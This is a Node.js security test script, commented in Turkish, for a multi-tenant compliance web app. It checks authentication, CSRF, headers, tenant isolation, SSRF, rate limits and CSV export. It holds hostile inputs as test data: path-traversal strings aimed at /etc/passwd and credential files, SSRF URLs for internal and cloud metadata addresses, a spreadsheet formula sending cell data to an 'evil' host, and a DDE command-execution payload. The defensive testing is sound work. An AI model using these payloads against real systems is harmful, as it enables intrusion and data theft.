#!/usr/bin/env node
'use strict';
/* Diurna güvenlik testleri — çalışan sunucuya karşı (bağımlılıksız, Node >= 20).
 *
 *   UM_TEST_BASE=http://127.0.0.1:3199 node scripts/security-tests.js
 *
 * ÖNEMLİ: Bunu CANLI/ÜRETİM verisine karşı çalıştırmayın. Boş bir UM_DATA_DIR ile açılmış geçici bir örnekle çalıştırın:
 *   UM_DATA_DIR=$(mktemp -d) UM_CACHE_DIR=$(mktemp -d) PORT=3199 node server.js &
 * Test, demo tohum kullanıcılarına (README) ve iki kiracıya (demo / ornek-katilim) ihtiyaç duyar.
 *   UM_TEST_PASSWORD   (varsayılan Uyum-Demo#2026)       UM_TEST_ORG_A / UM_TEST_ORG_B  (varsayılan @demo-banka.example / @ornek-katilim.example)
 *   UM_TEST_STRICT=1   → bilinen/kabul edilmiş "KNOWN" bulguları da hata sayar (CI'da kapı olarak kullanın). Çıkış kodu 1 = başarısız.
 * Üç sonuç türü: PASS, FAIL (regresyon / açık), KNOWN (dokümante edilmiş açık; STRICT'te FAIL). */
const BASE = (process.env.UM_TEST_BASE || 'http://127.0.0.1:3199').replace(/\/$/, '');
const PW = process.env.UM_TEST_PASSWORD || 'Uyum-Demo#2026';
const A = process.env.UM_TEST_ORG_A || 'demo-banka.example', B = process.env.UM_TEST_ORG_B || 'ornek-katilim.example';
const STRICT = process.env.UM_TEST_STRICT === '1';
const res = { pass: 0, fail: 0, known: 0 }; const lines = [];
function t(name, ok, detail = '', known = false) {
  if (ok) { res.pass++; lines.push(`  ✔ ${name}`); }
  else if (known && !STRICT) { res.known++; lines.push(`  ~ KNOWN ${name}${detail ? ' — ' + detail : ''}`); }
  else { res.fail++; lines.push(`  ✘ FAIL  ${name}${detail ? ' — ' + detail : ''}`); }
}
class Client {
  constructor(label) { this.label = label; this.cookie = ''; this.csrf = ''; this.user = null; }
  async raw(method, path, { body, headers = {}, csrf = true, noCookie = false, json = true, redirect = 'manual' } = {}) {
    const h = { ...headers }; if (body !== undefined && json) h['Content-Type'] = 'application/json';
    if (this.cookie && !noCookie) h.Cookie = this.cookie; if (csrf && this.csrf && method !== 'GET') h['X-CSRF-Token'] = this.csrf;
    let r; try { r = await fetch(BASE + path, { method, headers: h, body: body === undefined ? undefined : (json && typeof body !== 'string' ? JSON.stringify(body) : body), redirect }); } catch (e) { return { status: 0, headers: new Headers(), text: String(e.cause?.code || e.message), data: null }; }
    const txt = await r.text().catch(() => ''); let data = null; try { data = JSON.parse(txt); } catch { }
    return { status: r.status, headers: r.headers, text: txt, data };
  }
  get(p, o) { return this.raw('GET', p, o); } post(p, b, o) { return this.raw('POST', p, { body: b ?? {}, ...o }); } put(p, b, o) { return this.raw('PUT', p, { body: b ?? {}, ...o }); } del(p, o) { return this.raw('DELETE', p, o); }
  async login(email, password = PW) {
    const r = await this.raw('POST', '/api/auth/login', { body: { email, password }, csrf: false, noCookie: true });
    if (r.status !== 200 || !r.data?.csrf) throw new Error(`login ${email} → ${r.status} ${r.text.slice(0, 120)}`);
    const sc = r.headers.getSetCookie?.() || [r.headers.get('set-cookie')]; this.cookieRaw = sc.join(' | '); this.cookie = sc.map(c => c.split(';')[0]).join('; '); this.csrf = r.data.csrf; this.user = r.data.user; return r;
  }
}
const ok2xx = s => s >= 200 && s < 300; const denied = s => s === 401 || s === 403 || s === 404;

async function main() {
  console.log(`Diurna güvenlik testleri → ${BASE}${STRICT ? '  [STRICT]' : ''}\n`);
  const users = {};
  const mk = async (key, mail) => { const c = new Client(key); await c.login(mail); users[key] = c; return c; };
  const adminA = await mk('adminA', `admin@${A}`), mgrA = await mk('mgrA', `yonetici@${A}`), anA = await mk('anA', `analist1@${A}`), affA = await mk('affA', `istirak@${A}`);
  const adminB = await mk('adminB', `admin@${B}`);

  /* ── 1. Kimlik doğrulama gerekli ── */
  lines.push('\n[1] Kimliksiz erişim');
  const anon = new Client('anon');
  for (const [m, p] of [['GET', '/api/status'], ['GET', '/api/customers'], ['GET', '/api/audit'], ['GET', '/api/bulletins'], ['GET', '/api/tasks'], ['GET', '/api/org/users'], ['GET', '/api/events'], ['GET', '/api/outbox'], ['GET', '/api/platform/overview'], ['GET', '/api/apikeys'], ['POST', '/api/screen'], ['POST', '/api/customers'], ['GET', '/api/reader/x'], ['GET', '/api/export/audit.json']]) {
    const r = await anon.raw(m, p, { body: m === 'POST' ? {} : undefined, csrf: false }); t(`${m} ${p} kimliksiz → 401`, r.status === 401, 'status=' + r.status);
  }
  const bad = await anon.raw('GET', '/api/v1/entities', { headers: { Authorization: 'Bearer um_live_nope' } }); t('API v1 geçersiz anahtar → 401', bad.status === 401);

  /* ── 2. Çerez / oturum ── */
  lines.push('\n[2] Oturum ve çerez');
  const ck = adminA.cookieRaw || '';
  t('Oturum çerezi HttpOnly', /HttpOnly/i.test(ck)); t('Oturum çerezi SameSite=Strict', /SameSite=Strict/i.test(ck)); t('Çerez Path=/ ve Max-Age sınırlı (≤12 sa)', /Path=\//.test(ck) && (+(/Max-Age=(\d+)/.exec(ck) || [])[1] || 1e9) <= 43200);
  if (/^https:/.test(BASE) || process.env.UM_FORCE_SECURE === '1') t('Çerez Secure + __Host- öneki', /Secure/i.test(ck) && /__Host-um_sid/.test(ck)); else lines.push('  - (HTTP üzerinde Secure/__Host- denetimi atlandı; üretimde UM_FORCE_SECURE=1 ile çalıştırın)');
  const noCsrf = await adminA.raw('PUT', '/api/me/prefs', { body: { lang: 'tr' }, csrf: false }); t('CSRF belirteci olmadan değiştirme → 403', noCsrf.status === 403, 'status=' + noCsrf.status);
  const wrongOrigin = await adminA.raw('PUT', '/api/me/prefs', { body: { lang: 'tr' }, headers: { Origin: 'https://evil.example' } }); t('Yabancı Origin ile değiştirme → 403', wrongOrigin.status === 403, 'status=' + wrongOrigin.status);
  const sid1 = /um_sid=([a-f0-9]+)/.exec(adminA.cookie)?.[1]; const probe = new Client('probe'); await probe.login(`admin@${A}`); const sid2 = /um_sid=([a-f0-9]+)/.exec(probe.cookie)?.[1]; t('Her girişte yeni oturum kimliği (sabitleme yok)', sid1 && sid2 && sid1 !== sid2);
  await probe.post('/api/auth/logout'); const afterLogout = await probe.get('/api/status'); t('Çıkıştan sonra oturum geçersiz (sunucu tarafı iptal)', afterLogout.status === 401, 'status=' + afterLogout.status);
  const lg = await anon.raw('POST', '/api/auth/login', { body: { email: `nobody@${A}`, password: 'x' }, csrf: false }); t('Hatalı girişte yığın izi/yol sızmaz', !/at .*\.js:\d+|node_modules|\/app\/|\/workspace\//.test(lg.text));
  const sse = await fetch(BASE + '/api/events', { headers: { Cookie: adminA.cookie }, signal: AbortSignal.timeout(1500) }).catch(e => e); t('SSE oturumlu bağlantı kabul edilir', sse && sse.status === 200); try { sse.body?.cancel(); } catch { }

  /* ── 3. Başlıklar ── */
  lines.push('\n[3] Güvenlik başlıkları');
  const idx = await anon.raw('GET', '/', { csrf: false }); const H = n => idx.headers.get(n) || ''; const csp = H('content-security-policy');
  t('CSP: script-src \'self\' (unsafe-inline/eval yok)', /script-src 'self'/.test(csp) && !/script-src[^;]*unsafe-(inline|eval)/.test(csp));
  t('CSP: style-src içinde unsafe-inline YOK', !/(^|;\s*)style-src\s[^;]*unsafe-inline/.test(csp), 'style-src unsafe-inline var', false);
  t('CSP: frame-ancestors none, base-uri none, object-src none', /frame-ancestors 'none'/.test(csp) && /base-uri 'none'/.test(csp) && /object-src 'none'/.test(csp));
  t('X-Content-Type-Options: nosniff', H('x-content-type-options') === 'nosniff'); t('X-Frame-Options: DENY', H('x-frame-options') === 'DENY'); t('Referrer-Policy: no-referrer', H('referrer-policy') === 'no-referrer');
  t('COOP/CORP same-origin', H('cross-origin-opener-policy') === 'same-origin' && H('cross-origin-resource-policy') === 'same-origin'); t('X-Powered-By yok', !H('x-powered-by'));
  const api = await adminA.get('/api/status'); t('API yanıtı Cache-Control: no-store', /no-store/.test(api.headers.get('cache-control') || ''));
  const cors = await anon.raw('GET', '/api/public/brand', { headers: { Origin: 'https://evil.example' }, csrf: false }); t('CORS: Access-Control-Allow-Origin yok', !cors.headers.get('access-control-allow-origin'));
  const pre = await anon.raw('OPTIONS', '/api/customers', { headers: { Origin: 'https://evil.example', 'Access-Control-Request-Method': 'POST' }, csrf: false }); t('CORS ön uçuş izin vermez', !pre.headers.get('access-control-allow-origin'));
  if (/^https:/.test(BASE) || process.env.UM_FORCE_SECURE === '1') t('HSTS (HTTPS)', /max-age=\d{7,}/.test(H('strict-transport-security')));

  /* ── 4. Yol gezme / hata sızıntısı ── */
  lines.push('\n[4] Dosya yolu ve hata iletileri');
  for (const p of ['/../data/state/users.json', '/%2e%2e/data/state/users.json', '/..%2fserver.js', '/%2e%2e%2f%2e%2e%2fetc/passwd', '/js/../../server.js', '/..\\server.js', '/%00', '/.datakey', '/data/state/users.json', '/.git/config', '/package.json']) {
    const r = await new Promise(ok => { const u = new URL(BASE + p); import('node:net').then(({ connect }) => { const s = connect(+u.port || 80, u.hostname); let b = ''; s.on('data', d => b += d); s.on('close', () => ok(b)); s.on('error', () => ok('')); s.write(`GET ${p} HTTP/1.1\r\nHost: ${u.host}\r\nConnection: close\r\n\r\n`); setTimeout(() => s.destroy(), 2000); }); });
    const leaked = /"pwHash"|root:x:|require\('http'\)|"name": "uyum-merkezi"|\[core\]|^[0-9a-f]{64}$/m.test(r.split('\r\n\r\n').slice(1).join('')); t(`Yol gezme ${p} → içerik sızmaz`, !leaked);
  }
  const u1 = await new Promise(ok => import('node:net').then(({ connect }) => { const s = connect(+new URL(BASE).port, new URL(BASE).hostname); let b = ''; s.on('data', d => b += d); s.on('close', () => ok(b)); s.on('error', () => ok('')); s.write('GET /api/%zz HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n'); setTimeout(() => s.destroy(), 2000); }));
  t('Bozuk yüzde-kodlama (%zz) iç hata iletisi sızdırmaz', !/URI malformed|URIError|decodeURI/.test(u1), 'ham istisna iletisi döner', true);
  const big = await adminA.raw('PUT', '/api/me/prefs', { body: 'x'.repeat(2e6), json: false, headers: { 'Content-Type': 'application/json' } }); t('1 MB üstü JSON gövde reddedilir (413/400/ağ hatası)', [0, 400, 413].includes(big.status), 'status=' + big.status);

  /* ── 5. Rol kapıları ── */
  lines.push('\n[5] Rol kapıları (iştirak/Okuyucu dahil)');
  const reads = ['/api/customers', '/api/match', '/api/tasks', '/api/analytics', '/api/trade/notes', '/api/dd', '/api/outbox', '/api/audit', '/api/org/users', '/api/settings/full', '/api/apikeys', '/api/webhooks', '/api/blocklist', '/api/export/audit.json', '/api/ai/log', '/api/fetch/stats', '/api/me/watchlist', '/api/watch', '/api/roi'];
  const mustDenyAff = ['/api/customers', '/api/match', '/api/tasks', '/api/analytics', '/api/trade/notes', '/api/dd', '/api/outbox', '/api/audit', '/api/org/users', '/api/settings/full', '/api/apikeys', '/api/webhooks', '/api/blocklist', '/api/export/audit.json', '/api/ai/log', '/api/fetch/stats', '/api/roi'];
  for (const p of mustDenyAff) { const r = await affA.get(p); t(`Okuyucu(iştirak) GET ${p} reddedilir`, denied(r.status) || r.status === 422, 'status=' + r.status, true); }
  const adminOnly = ['/api/org/users', '/api/settings/full', '/api/apikeys', '/api/webhooks', '/api/export/audit.json', '/api/ai/log', '/api/fetch/stats'];
  for (const [who, c] of [['Analist', anA], ['Uyum Yöneticisi', mgrA]]) for (const p of adminOnly) { const r = await c.get(p); t(`${who} GET ${p} reddedilir (yalnız Admin/users)`, denied(r.status), 'status=' + r.status); }
  for (const p of ['/api/audit', '/api/blocklist']) { const r = await anA.get(p); t(`Analist GET ${p} reddedilir (approve gerekir)`, denied(r.status), 'status=' + r.status); }
  const writes = [['POST', '/api/customers/sample'], ['DELETE', '/api/customers'], ['POST', '/api/tasks'], ['POST', '/api/trade/notes'], ['POST', '/api/dd/library'], ['PUT', '/api/settings'], ['POST', '/api/blocklist'], ['POST', '/api/apikeys'], ['POST', '/api/webhooks'], ['POST', '/api/org/users'], ['POST', '/api/match/run'], ['POST', '/api/dd/draft'], ['POST', '/api/screen/goodguys']];
  for (const [m, p] of writes) { const r = await affA.raw(m, p, { body: m === 'DELETE' ? undefined : {} }); t(`Okuyucu ${m} ${p} reddedilir`, denied(r.status), 'status=' + r.status, true); }
  const ar = await affA.post('/api/ai/summary', { ids: [] }); t('Okuyucu yapay zekâ uç noktalarını kullanamaz', denied(ar.status) || ar.status === 503 && false, 'status=' + ar.status, true);
  const aff = await affA.get('/api/bulletins'); t('Okuyucu bülten listesinde yalnızca onaylı + sade kayıt görür', aff.status === 200 && Array.isArray(aff.data) && aff.data.every(b => b.status === 'approved'));
  const al = await adminA.get('/api/bulletins'); const draftB = (al.data || []).find(b => b.status !== 'approved');
  if (draftB) { const r = await affA.get(`/api/bulletins/${draftB.id}`); t('Okuyucu onaysız bülteni göremez', denied(r.status)); const r2 = await affA.get(`/api/bulletins/${draftB.id}/render?version=internal`); t('Okuyucu iç sürümü render edemez', denied(r2.status)); }
  const today = await adminA.get('/api/bulletins/today'); const bid = today.data?.id;
  if (bid) { const rr = await affA.get(`/api/bulletins/${bid}/render?version=internal&format=text`); t('Okuyucu "internal" bülten sürümünü alamaz (QA bulgusu)', denied(rr.status), 'status=' + rr.status); const rb = await affA.get(`/api/bulletins/${bid}`); t('Okuyucu bülten ayrıntısında iç alanları (baseCheck/iç not) görmez', !JSON.stringify(rb.data || {}).match(/baseCheck|internalNote|base_tespit|"note"/i)); }
  const pa = await adminA.get('/api/platform/overview'); t('Kiracı Admin platform uçlarına erişemez', denied(pa.status), 'status=' + pa.status);
  const sel = await adminA.put(`/api/org/users/${adminA.user.id}`, { role: 'Analist' }); t('Admin kendi rolünü düşüremez/değiştiremez', sel.status === 422);
  const pl = await adminA.post('/api/org/users', { email: `x${Date.now()}@${A}`, name: 'x', role: 'Platform' }); t('Kiracı Admin "Platform" rolü atayamaz', pl.status === 422);
  const mf = await anA.get('/api/status'); t('/api/status SMTP parolası/ip allowlist sızdırmaz', !JSON.stringify(mf.data).match(/"pass"|smtp/i) && mf.data.settings?.security?.ipAllowlist === undefined);

  /* ── 6. Kiracılar arası erişim (IDOR) ── */
  lines.push('\n[6] Kiracı yalıtımı (A kurumu verisine B kurumundan erişim)');
  const mark = 'XTENANT-' + Date.now();
  const tk = await adminA.post('/api/tasks', { title: mark + ' görev', description: 'gizli', priority: 'high' }); const taskId = tk.data?.id; t('A kurumunda görev oluşturuldu', ok2xx(tk.status) && !!taskId, 'status=' + tk.status);
  const wh = await adminA.post('/api/webhooks', { url: 'https://example.com/hook', events: [] }); const hookId = wh.data?.id;
  const ak = await adminA.post('/api/apikeys', { name: mark }); const keyId = ak.data?.id, keyVal = ak.data?.key;
  await adminA.post('/api/customers/sample'); const trade = await adminA.post('/api/trade/notes', { ref: mark, level: 'low', text: 'a' });
  const aUsers = await adminA.get('/api/org/users'); const aUserId = aUsers.data?.users?.find(u => u.role === 'Analist')?.id;
  const bTasks = await adminB.get('/api/tasks'); t('B görev listesi A görevini içermez', !JSON.stringify(bTasks.data).includes(mark));
  if (taskId) { const r = await adminB.put(`/api/tasks/${taskId}`, { status: 'closed', resolution: 'x', comment: 'hack' }); t('B, A görevini güncelleyemez', r.status === 404 || r.status === 403, 'status=' + r.status); const chk = await adminA.get('/api/tasks'); t('A görevi değişmeden duruyor', JSON.stringify(chk.data).includes(mark) && !JSON.stringify(chk.data).includes('hack')); }
  if (aUserId) { const r = await adminB.put(`/api/org/users/${aUserId}`, { active: false, role: 'Admin' }); t('B, A kullanıcısını değiştiremez/pasifleştiremez', r.status === 404 || r.status === 403, 'status=' + r.status); const r2 = await adminB.put(`/api/org/users/${aUserId}`, { resetMfa: true }); t('B, A kullanıcısının MFA\'sını sıfırlayamaz', r2.status === 404 || r2.status === 403, 'status=' + r2.status); }
  const bUsers = await adminB.get('/api/org/users'); t('B kullanıcı listesinde A e-postaları yok', !JSON.stringify(bUsers.data).includes(`@${A}`));
  if (hookId) { await adminB.del(`/api/webhooks/${hookId}`); const r = await adminB.post(`/api/webhooks/${hookId}/test`); t('B, A webhook\'unu test/tetikleyemez', r.status === 404 || r.status === 403, 'status=' + r.status); const still = await adminA.get('/api/webhooks'); t('B silme denemesi A webhook\'unu silmedi', (still.data?.hooks || []).some(h => h.id === hookId)); }
  if (keyId) { await adminB.del(`/api/apikeys/${keyId}`); const still = await adminA.get('/api/apikeys'); t('B, A API anahtarını iptal edemez', (still.data || []).some(k => k.id === keyId && !k.revoked)); const bl = await adminB.get('/api/apikeys'); t('B anahtar listesinde A anahtarı yok', !JSON.stringify(bl.data).includes(keyId)); }
  const bc = await adminB.get('/api/customers'); t('B müşteri tabanı A\'nın örnek müşterilerini içermez', !(bc.data?.meta?.filename) && (bc.data?.total || 0) === 0 || bc.data?.meta?.filename !== 'sample-customers.csv', JSON.stringify(bc.data?.meta || {}).slice(0, 100));
  const bm = await adminB.get('/api/match'); t('B eşleşme sonuçları boş / A\'nın müşterilerini içermez', !bm.data || (bm.data.hitCount || 0) === 0 || bm.data.screened === 0, JSON.stringify(bm.data || {}).slice(0, 100));
  const bauditS = JSON.stringify((await adminB.get('/api/audit')).data); t('B denetim kaydı A olaylarını içermez', !bauditS.includes(mark) && !bauditS.includes('customers.sample') && !bauditS.includes(`@${A}`));
  const bn = await adminB.get('/api/trade/notes'); t('B ticaret notları A notlarını içermez', !JSON.stringify(bn.data).includes(mark));
  for (const p of ['/api/outbox', '/api/webhooks']) { const r = await adminB.get(p); t(`B GET ${p} A verisi içermez`, !JSON.stringify(r.data).includes(mark) && !JSON.stringify(r.data).includes(`@${A}`)); }
  const outA = await adminA.get('/api/outbox'); const oid = outA.data?.[0]?.id; if (oid) { const r = await adminB.get(`/api/outbox/${oid}`); t('B, A giden kutusu öğesini okuyamaz', r.status === 404 || r.status === 403, 'status=' + r.status); const r3 = await affA.get(`/api/outbox/${oid}`); t('Okuyucu, kurumdaki başkasının giden kutusu öğesini okuyamaz', denied(r3.status), 'status=' + r3.status, true); }
  const rsB = await adminB.get('/api/status'); t('B /api/status kendi kurumu', rsB.data?.org?.id !== adminA.user.orgId && rsB.data?.org?.id === adminB.user.orgId);
  if (keyVal) { const e = await anon.raw('GET', '/api/v1/entities?limit=1', { headers: { Authorization: 'Bearer ' + keyVal }, csrf: false }); t('A API anahtarı yalnızca A bağlamında çalışır', e.status === 200); const bu = await anon.raw('GET', '/api/v1/bulletins', { headers: { Authorization: 'Bearer ' + keyVal }, csrf: false }); t('API anahtarı yanıtı B kurumuna ait veri içermez', !JSON.stringify(bu.data).includes(adminB.user.orgId)); await adminA.del(`/api/apikeys/${keyId}`); const e2 = await anon.raw('GET', '/api/v1/entities?limit=1', { headers: { Authorization: 'Bearer ' + keyVal }, csrf: false }); t('İptal edilen API anahtarı hemen geçersiz', e2.status === 401); }
  const trav = await adminB.get('/api/bulletins/..%2f..%2fdemo%2fbulletins'); t('Kimlik alanında yol gezme denemesi başarısız', trav.status === 404 || trav.status === 400);
  const sidA = /um_sid=([a-f0-9]+)/.exec(adminA.cookie)?.[1]; const forged = new Client('forged'); forged.cookie = 'um_sid=' + (sidA || '').replace(/.$/, c => c === '0' ? '1' : '0'); const fr = await forged.get('/api/status'); t('Değiştirilmiş oturum kimliği reddedilir', fr.status === 401);

  /* ── 7. SSRF / webhook ── */
  lines.push('\n[7] SSRF — webhook adresi doğrulaması (yalnızca doğrulama; gerçek dahili istek yapılmaz)');
  for (const u of ['http://127.0.0.1:3199/api/public/status', 'http://localhost/', 'http://[::1]/', 'http://0.0.0.0/', 'http://0177.0.0.1/', 'http://2130706433/', 'http://0x7f000001/', 'http://169.254.169.254/latest/meta-data/', 'http://[::ffff:169.254.169.254]/', 'http://10.0.0.5/', 'http://192.168.1.1/', 'http://172.16.0.1/', 'http://100.64.0.1/', 'http://metadata.google.internal/', 'http://service.internal/', 'file:///etc/passwd', 'ftp://example.com/']) {
    const r = await adminA.post('/api/webhooks', { url: u, events: [] }); const accepted = ok2xx(r.status); if (accepted && r.data?.id) await adminA.del(`/api/webhooks/${r.data.id}`);
    t(`Webhook ${u} reddedilir`, !accepted, 'kabul edildi (SSRF)', true);
  }

  /* ── 8. Parola / kilitleme / hız sınırı ── */
  lines.push('\n[8] Parola politikası, kilitleme, hız sınırı');
  const wk = await adminA.post('/api/me/password', { current: PW, next: 'password' }); t('Zayıf parola reddedilir', wk.status === 422 && wk.data?.error === 'weak');
  const sh = await adminA.post('/api/me/password', { current: PW, next: 'Aa1!aa' }); t('Kısa parola reddedilir', sh.status === 422);
  const victim = `analist2@${A}`; let last; for (let i = 0; i < 6; i++) last = await anon.raw('POST', '/api/auth/login', { body: { email: victim, password: 'Wrong-pass-' + i }, csrf: false });
  t('5 hatalı denemeden sonra yanıt hâlâ reddeder (401/423/429)', [401, 423, 429].includes(last.status), 'status=' + last.status);
  const good = await anon.raw('POST', '/api/auth/login', { body: { email: victim, password: PW }, csrf: false }); t('Kilitliyken doğru parola da kabul edilmez (hesap kilidi)', good.status !== 200, 'status=' + good.status);
  const ex = await anon.raw('POST', '/api/auth/login', { body: { email: `ghost-${Date.now()}@${A}`, password: 'x' }, csrf: false }); t('Kullanıcı numaralandırma: var olmayan hesap ile kilitli hesap aynı yanıt', ex.status === last.status || last.status === 429, `yok=${ex.status} kilitli=${last.status}`, true);
  let c429 = 0; for (let i = 0; i < 30; i++) { const r = await anon.raw('POST', '/api/auth/login', { body: { email: `x${i}@${A}`, password: 'y' }, csrf: false }); if (r.status === 429) { c429++; break; } } t('Giriş uç noktasında IP başına hız sınırı devreye girer', c429 > 0);
  const spoof = await anon.raw('POST', '/api/auth/login', { body: { email: 'a@b.c', password: 'y' }, csrf: false, headers: { 'X-Forwarded-For': '203.0.113.' + (1 + Math.floor(Math.random() * 250)) } }); t('X-Forwarded-For ile sahte IP hız sınırını sıfırlayamaz', spoof.status === 429 || process.env.UM_TRUST_PROXY !== '1', 'UM_TRUST_PROXY=1 iken soldaki XFF değeri güvenilir');

  /* ── 9. CSV/dışa aktarma ── */
  lines.push('\n[9] CSV formül enjeksiyonu ve yükleme sınırı');
  const ev = '=HYPERLINK("http://evil/?x="&A1)'; await adminA.post('/api/trade/check', { ref: ev, hs: [], imo: [], countries: ['TR'] });
  const csv = await adminA.get('/api/audit.csv'); const cells = csv.text.split(/\r?\n/).flatMap(l => l.split(';')); t('audit.csv: "=" ile başlayan hücre kaçışlanır', !cells.some(c => /^"[=+\-@]/.test(c)) && csv.text.includes("'=HYPERLINK"), csv.status + '');
  const huge = await adminA.raw('POST', '/api/customers', { body: JSON.stringify({ csv: 'a'.repeat(13e6), filename: 'x.csv' }), json: false, headers: { 'Content-Type': 'application/json' } }); t('12 MB üstü CSV gövdesi reddedilir', [0, 400, 413].includes(huge.status), 'status=' + huge.status);
  const delim = await adminA.post('/api/customers', { csv: 'ad_unvan;kimlik_no\r\n=cmd|\' /C calc\'!A0;123\r\n', filename: 'inj.csv', dryRun: true }); t('Formül içeren CSV hücresi içe aktarmada çalıştırılmaz/ yalnızca veri', delim.status === 200 || delim.status === 422);

  /* ── 10. Yedek: gizli bilgi ifşası ── */
  lines.push('\n[10] Yanıtlarda gizli bilgi');
  for (const p of ['/api/status', '/api/org/users', '/api/me/security', '/api/settings/full', '/api/webhooks', '/api/apikeys']) { const r = await adminA.get(p); { const mm = /"pwHash"|\$argon2|scrypt\$|"secret":"[0-9a-f]{20,}|um_live_[A-Za-z0-9_-]{20,}|"pending":"enc1|"recovery":\[/.exec(r.text); t(`GET ${p} parola özeti/TOTP sırrı/ham API anahtarı içermez`, !mm, mm && r.text.slice(Math.max(0, mm.index - 40), mm.index + 60)); } }
  const wk2 = await adminA.get('/api/webhooks'); t('Webhook gizli anahtarı maskeli', (wk2.data?.hooks || []).every(h => /…$/.test(h.secret || '…')));

  console.log(lines.join('\n')); console.log(`\nSonuç: ${res.pass} geçti, ${res.fail} BAŞARISIZ, ${res.known} bilinen/açık${STRICT ? '' : ' (STRICT=1 ile bunlar da başarısız sayılır)'}`);
  process.exit(res.fail ? 1 : 0);
}
main().catch(e => { console.error('Test çalıştırıcı hatası:', e.message); process.exit(2); });
